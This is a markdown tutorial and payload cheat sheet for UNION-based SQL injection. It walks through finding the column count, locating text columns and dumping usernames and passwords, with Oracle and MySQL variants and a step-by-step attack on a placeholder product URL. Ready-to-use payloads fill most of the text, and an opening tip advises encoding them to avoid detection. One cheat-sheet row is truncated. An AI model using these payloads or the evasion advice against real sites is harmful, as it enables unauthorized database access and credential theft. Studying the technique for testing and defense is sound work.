## 🧩 UNION-Based SQL Injection

>Use HackTovert on BurpSuite to pass Payload (encoding is necessary to avoid detection)

SQL injection using `UNION` lets attackers **combine results from different queries** and pull data from _other tables_ into the visible page.

---

## 📌 What is a UNION SQLi?

> UNION allows appending results from **another SELECT query** to the original one.

### 🧪 Example:

`SELECT name, price FROM products `
`UNION  SELECT username, password FROM users`

➡️ App will now show usernames and passwords **in place of** or **in addition to** product names and prices.

---

## ⚠️ UNION SQLi Requirements

To work, the injected `UNION SELECT` must meet **2 key conditions**:

1. **Same number of columns** as original query
2. **Compatible data types** in each column

---

## 🔍 How to Find Column Count


### 🔹 1. Using `ORDER BY` Method

Keep increasing column index until error:
`' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- ...`

✅ When it errors, the previous number was the actual column count.

---

### 🔹 2. Using `UNION SELECT NULL`

Inject increasing `NULL`s:

`UNION SELECT NULL-- `
`UNION SELECT NULL,NULL-- '`
`UNION SELECT NULL,NULL,NULL--`
`...`

✅ When it works, you found the correct number of columns.

> 💡 NULL works for all types → increases success rate.

---

## 🔎 Detecting Valid String Columns

You need at least one **text-compatible column** to extract string data (like `username`, `email`, etc.)

### 🧪 Inject strings one by one:

`UNION SELECT 'a',NULL,NULL-- `
`UNION SELECT NULL,'a',NULL-- `
`UNION SELECT NULL,NULL,'a'--`

✅ Page displays `a` somewhere → that column can hold text.

❌ Error like:  
`Conversion failed when converting 'a' to INT` → column is numeric only.

---

## 📥 Retrieving Table Data

Once column count and text-compat columns are known:

### 🧨 Inject:

`' UNION SELECT username, password FROM users--`

✅ Will display usernames and passwords if injected correctly.

> You need correct **table name** and **column names**.

---

## 🧪 Concatenating Data in One Column

If only **one column** is shown in the app, **combine fields**:

### 🔹 On Oracle:

`' UNION SELECT username || '~' || password FROM users--`

➡️ Output: `admin~s3cure`, `john~1234`, etc.

### 🔹 On MySQL:

`' UNION SELECT CONCAT(username, '~', password) FROM users--`

---

## 🧭 Oracle-Specific Syntax

- Oracle requires `FROM DUAL` for SELECT without a table:

`' UNION SELECT NULL,NULL FROM DUAL--`

---

## 💬 Comment Styles

|DBMS|Comment Syntax|
|---|---|
|**MySQL**|`--` (MUST include space), or `#`|
|**PostgreSQL**|`--`|
|**Oracle**|`--`|
|**MSSQL**|`--`, `/* */`|

---

## 🔧 Useful Union Payloads Cheat Sheet

|Goal|Payload|
|---|---|
|Detect column count|`' ORDER BY 1--` → keep increasing|
|Match column count|`' UNION SELECT NULL,NULL--`|
|Find string-compatible col|`' UNION SELECT 'a',NULL--` (one-by-one)|
|Dump data|`' UNION SELECT username, password FROM users--`|
|Single column output|`' UNION SELECT CONCAT(username, ':', password) FROM users--`|
|Oracle version|`' UNION SELECT username|

## 🧪 Testing UNION SQLi on a Website (Step-by-Step with Payload Examples)

Let’s say you find this URL on a website:

`https://vuln-site.com/products?category=Gifts`

You suspect that `category` parameter is vulnerable.

---

### 🔹 Step 1: **Test for SQLi Vulnerability**

**Payload:**
`https://vuln-site.com/products?category=Gifts'`

➡️ If the page crashes, shows a SQL error, or behaves weirdly → it’s likely injectable.

---

### 🔹 Step 2: **Find Number of Columns Using ORDER BY**

Try incrementally increasing values until error:

`https://vuln-site.com/products?category=Gifts' ORDER BY 1-- 
`https://vuln-site.com/products?category=Gifts' ORDER BY 2--`
`https://vuln-site.com/products?category=Gifts' ORDER BY 3--`
` ...`

➡️ If `ORDER BY 4--` causes an error, then the correct number of columns is **3**.

---

### 🔹 Step 3: **Confirm with UNION SELECT NULLs**

Now test if UNION SELECT works with that number:

`https://vuln-site.com/products?category=Gifts' UNION SELECT NULL,NULL,NULL--`

➡️ If no error, page is likely vulnerable to UNION SQLi.

---

### 🔹 Step 4: **Test Which Columns Are Visible (Text-Compatible)**

Replace one NULL with `'a'` at a time:

`https://vuln-site.com/products?category=Gifts' UNION SELECT 'a',NULL,NULL-- https://vuln-site.com/products?category=Gifts' UNION SELECT NULL,'a',NULL-- https://vuln-site.com/products?category=Gifts' UNION SELECT NULL,NULL,'a'--`

➡️ If you see `'a'` on the page, that column is **reflected and can hold string data**.

---

### 🔹 Step 5: **Dump Data from Users Table**

Now try dumping real data (if table and column names are known or guessed):

`https://vuln-site.com/products?category=Gifts' UNION SELECT username, password, NULL FROM users--`

> Adjust `NULL` and position based on number of columns and visible ones.